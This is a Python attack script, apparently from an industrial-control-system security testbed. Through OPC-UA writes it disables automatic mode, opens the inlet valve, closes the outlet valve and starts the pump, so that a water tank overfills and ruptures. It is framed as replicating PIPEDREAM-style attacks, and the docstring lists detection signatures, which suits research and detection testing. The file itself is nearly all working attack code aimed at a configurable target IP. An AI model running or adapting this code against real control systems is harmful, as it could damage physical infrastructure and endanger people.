#!/usr/bin/env python3
"""
Water Tank Overflow Attack

PIPEDREAM-style attack against water tank process:
1. Disable automatic mode
2. Open inlet valve
3. Close outlet valve
4. Tank fills uncontrollably
5. Pressure builds -> explosion

This replicates real-world ICS attacks that manipulate
process control to cause physical damage.
"""

import logging
import time
import sys

# Setup logging BEFORE imports
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)

try:
    from .opcua_attack import OPCUAAttack
except ImportError:
    from opcua_attack import OPCUAAttack

logger = logging.getLogger('AttackWaterTank')
logger.setLevel(logging.INFO)


class AttackWaterTank(OPCUAAttack):
    """
    Water Tank Overflow Attack

    Attack strategy:
    - Switch to manual mode (disable safety automation)
    - Open inlet valve fully
    - Close outlet valve
    - Optionally enable pump for faster fill
    - Wait for tank to overflow/explode

    Detection signatures:
    - Mode change from AUTO to MANUAL
    - Inlet valve opened while outlet closed
    - Rapid water level increase
    - Pressure increase beyond normal
    """

    def get_process_name(self) -> str:
        return "WaterTank"

    def get_attack_name(self) -> str:
        return "Water Tank Overflow/Explosion"

    def get_expected_effect(self) -> str:
        return "Tank fills uncontrollably, pressure builds, leading to tank rupture"

    def execute_attack(self) -> bool:
        """Execute the water tank attack"""

        # Step 1: Disable automatic mode
        logger.warning("[ATTACK] Step 1: Disabling automatic mode...")
        logger.info("         This prevents safety automation from intervening")

        success = self.write_node('Commands.AutoModeCommand', False)
        if not success:
            logger.error("[-] Failed to disable auto mode")
            return False

        time.sleep(1)

        # Verify mode change
        auto_mode = self.read_node('Status.AutoModeStatus')
        if auto_mode:
            logger.warning("[!] Auto mode still enabled - attack may be blocked")

        # Step 2: Open inlet valve
        logger.warning("[ATTACK] Step 2: Opening inlet valve to 100%...")
        logger.info("         Water will now flow into the tank")

        success = self.write_node('Commands.InletValveCommand', True)
        if not success:
            logger.error("[-] Failed to open inlet valve")
            return False

        time.sleep(0.5)

        # Step 3: Close outlet valve
        logger.warning("[ATTACK] Step 3: Closing outlet valve...")
        logger.info("         Water cannot escape - tank will fill")

        success = self.write_node('Commands.OutletValveCommand', False)
        if not success:
            logger.error("[-] Failed to close outlet valve")
            return False

        time.sleep(0.5)

        # Step 4: Enable pump for faster attack
        logger.warning("[ATTACK] Step 4: Enabling pump for faster fill...")
        logger.info("         Pump increases inlet flow rate by 50%")

        success = self.write_node('Commands.PumpCommand', True)
        if not success:
            logger.warning("[!] Could not enable pump - continuing without")

        logger.warning("\n[!] ATTACK SEQUENCE COMPLETE")
        logger.warning("[!] Tank is now filling uncontrollably")
        logger.warning("[!] Expected sequence:")
        logger.warning("    1. Water level increases rapidly")
        logger.warning("    2. Overflow alarm triggers")
        logger.warning("    3. Pressure increases")
        logger.warning("    4. High pressure alarm triggers")
        logger.warning("    5. Tank rupture/explosion")

        return True


def main():
    """Test the water tank attack"""
    import argparse

    parser = argparse.ArgumentParser(description='Water Tank Attack')
    parser.add_argument('--target', default='192.168.1.6', help='Target IP (default: 192.168.1.6)')
    parser.add_argument('--port', type=int, default=4840, help='OPC-UA port')

    args = parser.parse_args()

    attack = AttackWaterTank(args.target, args.port)
    result = attack.run()

    print("\n" + "=" * 60)
    print("ATTACK RESULT")
    print("=" * 60)
    print(f"Success: {result.success}")
    print(f"Process: {result.process}")
    print(f"Attack: {result.attack_type}")
    print(f"Commands Sent: {result.commands_sent}")
    print(f"Nodes Modified: {result.nodes_modified}")
    print(f"Duration: {result.duration:.2f}s")
    if result.error:
        print(f"Error: {result.error}")
    print("=" * 60)


if __name__ == '__main__':
    main()
